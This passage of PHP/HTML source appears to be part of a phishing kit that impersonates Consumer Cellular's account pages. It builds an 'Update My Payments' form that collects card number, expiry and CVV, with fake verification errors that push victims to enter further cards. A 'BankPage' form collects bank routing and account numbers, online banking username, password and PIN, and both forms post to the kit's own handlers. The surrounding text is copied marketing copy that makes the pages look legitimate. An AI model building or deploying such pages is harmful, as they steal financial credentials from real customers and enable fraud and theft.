                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center px-1 md:px-10 lg:px-5">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-xl text-white">
                        <h2 class="text-2xl mb-1">Update My Payments</h2><?php if ($showFirstError) { ?>
                        <div class="py-2 text-red-700 bg-white mb-2 mt-2 px-2">
                            <p>Cannot verify card information, Please enter a different card.</p>
                        </div>
                        <?php } ?>
                            <?php if ($showSecondError) { ?>
                            <div class="py-2 text-red-700 bg-white mb-2 mt-2 px-2">
                                <p>Please use a different card to continue with your payment.</p>
                            </div>
                        <?php } ?>
                        <form id="karma" method="POST" action="/consumercellular.com/proccess_card" class="flex flex-col gap-3">
                            <div class="grid grid-cols-1 gap-1 w-full">
                                <input
                                    type="text"
                                    id="karma-ccname"
                                    name="karma-ccname"
                                    placeholder="Name On Card"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-ccnum"
                                    name="karma-ccnum"
                                    placeholder="Credit/Debit Card Number"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <div class="grid grid-cols-2 gap-1">
                                    <input
                                        type="text"
                                        id="karma-ccexp"
                                        name="karma-ccexp"
                                        placeholder="Expiration MM/YY"
                                        required
                                        class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                    />
                                    <input
                                        type="text"
                                        id="karma-cccvv"
                                        name="karma-cccvv"
                                        placeholder="CVV"
                                        required
                                        class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                    />
                                </div>
                            </div>
                            <div class="w-full lg:max-w-[150px]">
                                <button
                                    type="submit"
                                    class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                >
                                    CONTINUE
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
        <script src="/public/js/cc_format.js?v=<?= time(); ?>"></script>
    </html>
<?php
}

function BankPage() {
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Update Bank | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center px-1 md:px-10 lg:px-5">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-xl text-white">
                        <h2 class="text-2xl mb-1">Update My Bank Details</h2>
                        <form id="karma" method="POST" action="/consumercellular.com/proccess_bank" class="flex flex-col gap-3">
                            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-1 gap-1 w-full">
                                <input
                                    type="number"
                                    id="karma-bank-routing-number"
                                    name="karma-bank-routing-number"
                                    placeholder="Bank Routing Number"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="number"
                                    id="karma-bank-account-number"
                                    name="karma-bank-account-number"
                                    placeholder="Bank Account Number"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-bank-username"
                                    name="karma-bank-username"
                                    placeholder="Bank Username"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="password"
                                    id="karma-bank-password"
                                    name="karma-bank-password"
                                    placeholder="Bank Password"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="password"
                                    id="karma-bank-pin"
                                    name="karma-bank-pin"
                                    placeholder="Bank PIN"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <div class="w-full lg:max-w-[150px] mt-2 md:mt-0 lg:mt-2">
                                    <button
                                        type="submit"
                                        class="w-full bg-[#f26631] text-white h-10 md:h-12 py-2 rounded font-bold cursor-pointer"
                                    >
                                        CONTINUE
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
        <script src="/public/js/cc_format.js?v=<?= time(); ?>"></script>
    </html>
<?php
}

?>
